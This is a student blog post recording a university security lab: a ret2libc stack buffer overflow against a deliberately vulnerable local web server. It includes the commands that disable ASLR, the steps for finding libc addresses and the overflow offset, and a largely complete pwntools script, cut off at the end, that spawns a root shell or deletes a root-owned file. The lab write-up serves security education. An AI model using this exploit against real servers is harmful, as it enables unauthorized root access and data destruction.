@@ -1,0 +1,905 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HUST Information System Security Lab2-System Security | Life is not a race, but a journey</title><meta name="author" content="Xiang Li"><meta name="copyright" content="Xiang Li"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Operation process record for HUST Information System Security Lab2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HUST Information System Security Lab2-System Security">
+<meta property="og:url" content="https://xloverflow.github.io/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab2-System%20Security/index.html">
+<meta property="og:site_name" content="Life is not a race, but a journey">
+<meta property="og:description" content="Operation process record for HUST Information System Security Lab2">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://picx.zhimg.com/80/v2-06450eedf96def79a590cec5c6c0ecbd_720w.png">
+<meta property="article:published_time" content="2024-09-26T15:03:54.000Z">
+<meta property="article:modified_time" content="2026-02-15T05:04:17.012Z">
+<meta property="article:author" content="Xiang Li">
+<meta property="article:tag" content="Course Experiments">
+<meta property="article:tag" content="Study Notes">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://picx.zhimg.com/80/v2-06450eedf96def79a590cec5c6c0ecbd_720w.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HUST Information System Security Lab2-System Security",
+  "url": "https://xloverflow.github.io/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab2-System%20Security/",
+  "image": "https://picx.zhimg.com/80/v2-06450eedf96def79a590cec5c6c0ecbd_720w.png",
+  "datePublished": "2024-09-26T15:03:54.000Z",
+  "dateModified": "2026-02-15T05:04:17.012Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Xiang Li",
+      "url": "https://xloverflow.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://xloverflow.github.io/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab2-System%20Security/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HUST Information System Security Lab2-System Security',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://pica.zhimg.com/80/v2-b6830c2136b7784c0aba649af7ec2867_1440w.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">48</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">70</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">15</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/List/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/List/gallery/"><i class="fa-fw fa fa-image"></i><span> Album</span></a></li><li><a class="site-page child" href="/List/movies/"><i class="fa-fw fas fa-video"></i><span> Videos</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/books/"><i class="fa-fw fas fa-book"></i><span> Books</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://picx.zhimg.com/80/v2-06450eedf96def79a590cec5c6c0ecbd_720w.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Life is not a race, but a journey</span></a><a class="nav-page-title" href="/"><span class="site-name">HUST Information System Security Lab2-System Security</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/List/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/List/gallery/"><i class="fa-fw fa fa-image"></i><span> Album</span></a></li><li><a class="site-page child" href="/List/movies/"><i class="fa-fw fas fa-video"></i><span> Videos</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/books/"><i class="fa-fw fas fa-book"></i><span> Books</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><!-- Language switch button styled like menu item--><div class="menus_items lang-switch"><div class="menus_item"><a class="site-page lang-toggle" href="/zh/"><i class="fas fa-language fa-fw"></i><span> 中文</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">HUST Information System Security Lab2-System Security</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-09-26T15:03:54.000Z" title="Created 2024-09-26 11:03:54">2024-09-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-02-15T05:04:17.012Z" title="Updated 2026-02-15 00:04:17">2026-02-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/HUST-Lab-Reports/">HUST Lab Reports</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="information-system-security-lab2-record">Information System
+Security Lab2 Record</h1>
+<h2
+id="exploit-vulnerable-processes-of-web-server-to-obtain-shell-or-delete-root-privilege-file-tmptest">Exploit
+vulnerable processes of web server to obtain shell (or delete root
+privilege file /tmp/test)</h2>
+<h3 id="experiment-environment-configuration">Experiment Environment
+Configuration</h3>
+<p>First, the experiment environment needs to be configured.
+Specifically, need to disable ASLR, then compile the target program, set
+privileges for touchstone and start the server.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl -w kernel.randomize_va_space=0</span><br><span class="line">sudo make</span><br><span class="line">sudo chown root touchstone</span><br><span class="line">sudo chmod +s touchstone</span><br><span class="line">./touchstone</span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619105024424.png"
+alt="Process information after server startup" />
+<figcaption aria-hidden="true">Process information after server
+startup</figcaption>
+</figure>
+<p>Then use a browser to enter 127.0.0.1:80 to access the server
+interface, input username: lixiang and password: 123456 to register.</p>
+<h3 id="perform-exploit-attack">Perform exploit attack</h3>
+<p>First, use ldd to view the base address information of libc.so.6
+loading as <strong><code>0xf7d9d000</code></strong>.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd banksv</span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="C:\Users\11946\AppData\Roaming\Typora\typora-user-images\image-20240619110810753.png"
+alt="image-20240619110810753" />
+<figcaption aria-hidden="true">image-20240619110810753</figcaption>
+</figure>
+<p>Use ropper to view the offset address of “/bin/bash” string relative
+to the base address as <strong><code>0x0018e363</code></strong>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper --file /lib/i386-linux-gnu/libc.so.6 --string &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619110952993.png"
+alt="image-20240619110952993" />
+<figcaption aria-hidden="true">image-20240619110952993</figcaption>
+</figure>
+<p>Use readelf to view the addresses of system, exit, unlink functions
+as <code>0x00041780</code>, <code>0x000340c0</code>,
+<code>0x0004f4100</code> respectively.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot; system&quot;  </span><br><span class="line">readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot; exit&quot;  </span><br><span class="line">readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot; unlink&quot; </span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619112513036.png"
+alt="image-20240619112513036" />
+<figcaption aria-hidden="true">image-20240619112513036</figcaption>
+</figure>
+<p>Then according to the server logs, we can see the ebp address as
+<code>0xffffd218</code>.</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619112956513.png"
+alt="image-20240619112956513" />
+<figcaption aria-hidden="true">image-20240619112956513</figcaption>
+</figure>
+<p>Need to locate the vulnerability point getToken function.</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619123342290.png"
+alt="image-20240619123342290" />
+<figcaption aria-hidden="true">image-20240619123342290</figcaption>
+</figure>
+<p>The function uses a fixed-size character array <code>s[1024]</code>,
+but doesn’t check if <code>i</code> exceeds the array bounds. When the
+number of characters read exceeds 1024, a buffer overflow occurs, which
+is a stack overflow, then attacks can be implemented by overwriting the
+return address.</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> s[<span class="number">1024</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    s[i++] = c;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Modify the exploit-template.py script, replace the addresses with the
+above addresses. type1 is used to obtain shell, type2 is used to delete
+files. But first need to know what the vulnerability is.</p>
+<p>To find the overflow position, we must find the distance between the
+position storing the return address in the getToken() stack frame and
+the buffer s. Since the buffer variable s has a length of 1024, this
+length must be greater than 1024. Use the following code for
+probing:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">req += b&#x27;A&#x27; * 1024 + cyclic(200)</span><br></pre></td></tr></table></figure>
+<p>Run with python3 to get the following output.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit1.py 2 </span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619124023743.png"
+alt="image-20240619124023743" />
+<figcaption aria-hidden="true">image-20240619124023743</figcaption>
+</figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dmesg</span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://pic1.zhimg.com/80/v2-411d49bcdf3fe49ec2980dce39fe9808_720w.png"
+alt="image-20240619124114951" />
+<figcaption aria-hidden="true">image-20240619124114951</figcaption>
+</figure>
+<p>This is the kernel output log. We can see the return address was
+overwritten to 0x6161616c, which actually corresponds to “laaa”, then
+calculate the offset as 44, so 1024 + 44 = 1068 can overwrite the return
+address.</p>
+<ul>
+<li><p>Obtain shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit_1.py 1</span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619125150850.png"
+alt="image-20240619125150850" />
+<figcaption aria-hidden="true">image-20240619125150850</figcaption>
+</figure>
+<p>The result is as shown above, the addresses are system function, exit
+function, “/bin/sh” address in order, which matches the stack structure
+we want to construct.</p></li>
+<li><p>Delete file</p>
+<p>Next, test deleting /tmp/test.txt. First create /tmp/test.txt and
+change its owner to root.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch /tmp/test.txt</span><br><span class="line">sudo chown root /tmp/test.txt</span><br><span class="line">ll /tmp/test.txt</span><br></pre></td></tr></table></figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619125710551.png"
+alt="image-20240619125710551" />
+<figcaption aria-hidden="true">image-20240619125710551</figcaption>
+</figure>
+<figure>
+<img
+src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619125937003.png"
+alt="image-20240619125937003" />
+<figcaption aria-hidden="true">image-20240619125937003</figcaption>
+</figure></li>
+</ul>
+<p>The attack Python script is as follows:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python  </span></span><br><span class="line"><span class="keyword">import</span> sys  </span><br><span class="line"><span class="keyword">import</span> socket  </span><br><span class="line"><span class="keyword">import</span> traceback  </span><br><span class="line"><span class="keyword">import</span> struct  </span><br><span class="line"><span class="keyword">import</span> time  </span><br><span class="line"><span class="keyword">import</span> os.path  </span><br><span class="line"><span class="keyword">import</span> binascii  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># libc base address  </span></span><br><span class="line"><span class="comment"># ASLR shoud be off, so that libc&#x27;s base address will not change untill next reboot   </span></span><br><span class="line"><span class="comment"># you can use &quot;ldd ./program&quot; to check the libc base address  </span></span><br><span class="line">base_addr = <span class="number">0xf7d9d000</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># all of the offsets of functions (strings) inside libc vary little (sometimes change, previews check is needed) .  </span></span><br><span class="line"><span class="comment"># to get the offset of a funtion, you can use:  </span></span><br><span class="line"><span class="comment">##  readelf -a /lib/i386-linux-gnu/libc.so.6 | grep &quot; system&quot;  </span></span><br><span class="line"><span class="comment"># to get &quot;/bin/sh&quot;:  </span></span><br><span class="line"><span class="comment">## ropper --file /lib/i386-linux-gnu/libc.so.6 --string &quot;/bin/sh&quot;  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># system  </span></span><br><span class="line">sys_addr = base_addr + <span class="number">0x00041780</span></span><br><span class="line"><span class="comment"># /bin/sh  </span></span><br><span class="line">sh_addr = base_addr + <span class="number">0x0018e363</span> </span><br><span class="line"><span class="comment"># exit  </span></span><br><span class="line">ex_addr = base_addr + <span class="number">0x000340c0</span> </span><br><span class="line"><span class="comment"># unlink  </span></span><br><span class="line">ul_addr = base_addr + <span class="number">0x000f4100</span></span><br><span class="line"><span class="comment"># dead  </span></span><br><span class="line">d_addr = <span class="number">0xdeadbeef</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># ebp  too make the task simple, we print ebp of getToken function (vulnerable)   </span></span><br><span class="line">ebp_addr = <span class="number">0xffffd218</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment">## Below is the function that you should modify to construct an  </span></span><br><span class="line"><span class="comment">## HTTP request that will cause a buffer overflow in some part  </span></span><br><span class="line"><span class="comment">## of the vulnerable web server and exploit it.  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_exploit</span>(<span class="params">shellcode, <span class="built_in">type</span></span>):  </span><br><span class="line">  </span><br><span class="line">    ul_arg = <span class="string">&quot;/tmp/test.txt\0&quot;</span>  </span><br><span class="line">    ul_arg_addr = ebp_addr + <span class="number">20</span>  </span><br><span class="line">  </span><br><span class="line">    sys_arg = <span class="string">&quot;/bin/sh\0&quot;</span>  </span><br><span class="line">    sys_arg_addr = ebp_addr + <span class="number">20</span>  </span><br><span class="line">  </span><br><span class="line">    req = (<span class="string">&quot;POST / HTTP/1.1\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">    <span class="comment"># All of the header information other than &quot;Content-Length&quot; is not important  </span></span><br><span class="line">    req += (<span class="string">&quot;Host: 127.0.0.1\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">    <span class="comment"># The Content-Length below is useful, and depends on the length of   </span></span><br><span class="line">    <span class="comment"># username plus password, you need to use wireshark (together with web browser)   </span></span><br><span class="line">    <span class="comment"># for checking the length  </span></span><br><span class="line">    req += (<span class="string">&quot;Content-Length: 58\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)   </span><br><span class="line">    req += (<span class="string">&quot;Origin: http://127.0.0.1\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">    req += (<span class="string">&quot;Connection: keep-alive\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">    req += (<span class="string">&quot;Referer: http://127.0.0.1/\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">    req += (<span class="string">&quot;Hacking: &quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">    <span class="comment"># For different oses (and compilation), the length of fillup for   </span></span><br><span class="line">    <span class="comment"># hijacking the return address in the stack, could be different,  </span></span><br><span class="line">    <span class="comment"># therefore you need to debug the program for checking and adjusting.  </span></span><br><span class="line">    req += <span class="string">b&#x27;A&#x27;</span> * <span class="number">1068</span></span><br><span class="line">    <span class="comment"># b&#x27;C&#x27; * 4  </span></span><br><span class="line">  </span><br><span class="line">    <span class="comment"># use &quot;/bin/sh&quot; string in libc  </span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">1</span>:  </span><br><span class="line">        req += p32(sys_addr)  </span><br><span class="line">        req += p32(ex_addr)  </span><br><span class="line">        req += p32(sh_addr)  </span><br><span class="line">        req += p32(<span class="number">0</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># put &quot;/bin/sh&quot; string in the stack  </span></span><br><span class="line">    <span class="comment"># ebp is needed to locate the place of string   </span></span><br><span class="line">    <span class="comment"># Note: using this method, you can put arbitrary string in the stack,   </span></span><br><span class="line">    <span class="comment"># so that &quot;system&quot; can execute arbitrary command  </span></span><br><span class="line">    <span class="comment">#req += p32(sys_addr)  </span></span><br><span class="line">    <span class="comment">#req += p32(ex_addr)  </span></span><br><span class="line">    <span class="comment">#req += p32(sys_arg_addr)  </span></span><br><span class="line">    <span class="comment">#req += p32(0)  </span></span><br><span class="line">    <span class="comment">#req += sys_arg.encode(&#x27;latin-1&#x27;)  </span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># remove a file specified by the path &quot;ul_arg&quot;  </span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">2</span>:  </span><br><span class="line">        req += p32(ul_addr)  </span><br><span class="line">        req += p32(ex_addr)  </span><br><span class="line">        req += p32(ul_arg_addr)  </span><br><span class="line">        req += p32(<span class="number">0</span>)  </span><br><span class="line">        req += ul_arg.encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">      </span><br><span class="line">  </span><br><span class="line">    req += (<span class="string">&quot;\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">    req += (<span class="string">&quot;\r\n&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">     </span><br><span class="line">    <span class="comment"># Below is the username/password that you can Register into the web server  </span></span><br><span class="line">    <span class="comment"># by using web browser. These information will be stored into the sqlite db behind.  </span></span><br><span class="line">    <span class="comment"># You need to change these information according to your own registration.  </span></span><br><span class="line">   </span><br><span class="line">    <span class="comment"># Note that successful POST will be responded by the server with a hint page.  </span></span><br><span class="line">    <span class="comment"># By using the successful response, you can judge whether the server has been   </span></span><br><span class="line">    <span class="comment"># crashed (by exploit), so that you can adjust the fillup accordingly.  </span></span><br><span class="line">    req += (<span class="string">&quot;login_username=lixiang&amp;login_password=123456&amp;submit_login=Login&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(req)  </span><br><span class="line">    <span class="keyword">return</span> req  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">#If you cannot use p32 (in pwnlib), you can use the following line  </span></span><br><span class="line">    <span class="comment">#req += (addr1).to_bytes(4, byteorder=&#x27;little&#x27;)  </span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_req</span>(<span class="params">host, port, req</span>):  </span><br><span class="line">    sock = socket.socket(socket.AF_INET, 